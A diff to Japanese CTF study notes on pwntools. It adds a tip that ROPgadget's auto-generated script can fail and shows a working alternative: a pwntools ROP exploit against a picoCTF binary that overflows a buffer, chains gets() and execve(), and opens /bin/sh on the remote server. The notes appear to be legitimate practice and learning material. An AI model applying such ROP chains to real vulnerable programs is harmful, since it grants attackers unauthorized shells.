@@ -56,6 +56,37 @@ https://tech.kusuwada.com/entry/2019/10/12/023145#section1
 ``` context.log_level = "debug" ```  
 にすることで、recvした際にどのようなデータが飛んできているのかがわかる  
 
+### ROPGadgetを使用する際の注意点  
+ROPGadgetではオプションでpythonスクリプトを自動で出力してくれる機能があるが、  
+**これを使用するとうまく刺さらないことがある。**  
+#### 対処法  
+pwntoolsに実装されているchain()を使うことで刺さる  
+<details> 
+<summary>実装例を表示する </summary> 
+  
+```
+from pwn import *
+
+elf = ELF("vuln")
+context.binary = elf
+context.kernel = "amd64"
+
+s = remote("saturn.picoctf.net", 65000)
+#s = remote("localhost", 8888)
+
+rop = ROP(elf)
+rop.gets(0x080e5060)
+rop.execve(0x080e5060, 0, 0)
+print(rop.dump())
+s.sendline(b"a"*0x1c+rop.chain())
+
+s.sendline(b"/bin/sh")
+
+s.interactive()
+```
+  
+</details> 
+  
 
 
 
